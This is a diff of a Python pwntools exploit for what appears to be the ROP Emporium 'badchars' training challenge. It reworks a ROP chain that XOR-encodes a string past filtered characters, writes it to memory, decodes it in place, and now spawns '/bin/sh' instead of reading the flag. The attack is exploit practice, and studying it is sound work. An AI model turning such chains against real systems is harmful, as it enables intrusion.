@@ -34,8 +34,12 @@ continue
 io = start()
 
 # This program has a buffer overflow. The pwnme() function
-# calls fgets(buf, 50, stdin), although the buffer is only
-# 32 bytes large ...
+# allocates 512 bytes on the heap and fgets() into the buffer
+# (no overflow at this point). Then, it calls the checkBadchars()
+# function to remove bad characters from the heap buffer.
+# After that, it memcpy()s from the heap buffer to a local
+# buffer that is only 32 bytes large. This is where the buffer
+# overflow can happen.
 
 # Just look at 'objdump -M intel -d ./badchars'. In addition to
 # the usual main() calling pwnme(), you'll see the usefulGadgets()
@@ -86,15 +90,24 @@ def append_write(chain, addr, value):
     chain += p64(0x400b34)
     return chain
 
-def append_xor(chain, addr, bytekey):
-    # Return address of the gadget 'pop r14; pop r15; ret'
+def xor_memory(chain, addr, num, bytekey):
+    i = 0
+    # Return address of the gadget 'pop r14; pop r15; ret'.
+    # We are only interested in loading r14.
     chain += p64(0x400b40)
-    # The values for r14
+    # The value for r14
     chain += p64(bytekey)
-    # The values for r15
-    chain += p64(addr)
-    # Return address of the gadget 'xor [r15],r14b; ret'
-    chain += p64(0x400b30)
+    # The value for r15 (irrelevant)
+    chain += p64(0xdeadbeef)
+    while i < num:
+        # Return address of the gadget 'pop r15; ret'
+        chain += p64(0x400b42)
+        # The value for r15
+        chain += p64(addr + i)
+        # Return address of the gadget 'xor [r15],r14b; ret'
+        chain += p64(0x400b30)
+        i += 1
+
     return chain
 
 # A function to find a 8-bit XOR key to be applied to a string in
@@ -116,28 +129,29 @@ def find_xor_key(alphabet, badchars):
 
     print("Error: could not find a XOR bytekey")
     assert(False)
- 
+
+def hexstring(s):
+    return ''.join([x.encode('hex') for x in s])
+
 def write_string(chain, addr, s, badchars):
     # Pad the string with zeroes.
     s += '\x00' * (8 - (len(s) % 8))
 
-    # Find a suitable XOR key.
+    # Find a suitable XOR key and encode the string.
     bytekey = find_xor_key(s, badchars)
     print("XOR bytekey found: %s (%s)" % (bytekey, repr(chr(bytekey))))
+    es = ''.join([(chr(ord(x) ^ bytekey)) for x in s])
+    print("string: decoded |%s|, encoded |%s|" % (hexstring(s), hexstring(es)))
+    assert(len(s) == len(es))
 
-    # Extend the ROP chain to write the string in memory.
+    # Extend the ROP chain to write the encoded string in memory.
     i = 0
-    while i < len(s):
-        chain = append_write(chain, addr + i, u64(s[i:i+8]))
+    while i < len(es):
+        chain = append_write(chain, addr + i, u64(es[i:i+8]))
         i += 8
 
     # Extend the ROP chain to decode the string in place.
-    i = 0
-    while i < len(s):
-        chain = append_xor(chain, addr + i, bytekey)
-        i += 1
-
-    return chain
+    return xor_memory(chain, addr, len(es), bytekey)
 
 # We will write somewhere in the middle of the range [0x601000,0x602000),
 # which is writable, as shown by vmmap. Writing to the beginning of
@@ -147,7 +161,7 @@ def write_string(chain, addr, s, badchars):
 # knows why we get a crash).
 dest_addr = 0x601f00
 
-vector = write_string(vector, dest_addr, '/bin/cat flag.txt', 'bic/ fns')
+vector = write_string(vector, dest_addr, '/bin/sh', 'bic/ fns')
 
 # Append the address of a 'pop rdi; ret' gadget,
 # and the value of rdi (address of the crafted string).
